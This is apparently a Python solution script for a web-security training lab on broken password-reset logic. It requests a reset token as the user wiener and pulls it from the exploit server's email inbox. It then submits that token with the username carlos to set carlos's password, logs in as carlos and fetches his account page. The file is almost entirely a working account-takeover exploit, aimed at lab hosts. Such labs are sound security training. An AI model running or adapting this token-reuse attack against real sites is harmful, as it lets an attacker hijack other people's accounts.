###############################################################
#
# Lab: Password reset broken logic
#
# Hack Steps: 
#      1. Make forgot-password request as wiener
#      2. Extract the token from the email client
#      3. Change carlos password with the obtained token
#      4. Login as carlos with the new password
#      5. Fetch carlos profile
#
###############################################################
#N feito
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a5c00de03c947f583e3370700230014.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a4a00e103d1471583903633019d0002.exploit-server.net"

NEW_CARLOS_PASSWORD = "Hacked" # You can change this to what you want

def main():
    print("⦗1⦘ Making forgot-password request as wiener.. ", end="", flush=True)

    data={"username": "wiener"}
    post_data("/forgot-password", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the token from the email client.. ", end="", flush=True)

    email_client = fetch_email_client()
    token = re.findall("temp-forgot-password-token=(.*)'", email_client.text)[0]

    if len(token) != 0:  
        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "⦗3⦘ Changing carlos password with the obtained token.. ", end="", flush=True)
        
        change_carlos_password(token)

        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "🗹 Password was changed to " + Fore.GREEN + NEW_CARLOS_PASSWORD)
        print(Fore.WHITE + "⦗4⦘ Logging in as carlos with the new password.. ", end="", flush=True)
    
        data = { "username": "carlos", "password": NEW_CARLOS_PASSWORD }
        login_as_carlos = post_data("/login", data)

        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "⦗5⦘ Fetching carlos profile.. ", end="", flush=True)

        session = login_as_carlos.cookies.get("session")
        cookies = { "session": session }
        fetch("/my-account", cookies)
        
        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
    else:
        print(Fore.RED + "⦗!⦘ No token found on the email client")


def fetch_email_client():
    try:  
        return requests.get(f"{EXPLOIT_SERVER_URL}/email", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the email through exception")
        exit(1)


def change_carlos_password(token):
    data = {
            "temp-forgot-password-token": token,
            "username": "carlos",
            "new-password-1": NEW_CARLOS_PASSWORD,
            "new-password-2": NEW_CARLOS_PASSWORD
        }
    post_data("/forgot-password", data)


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()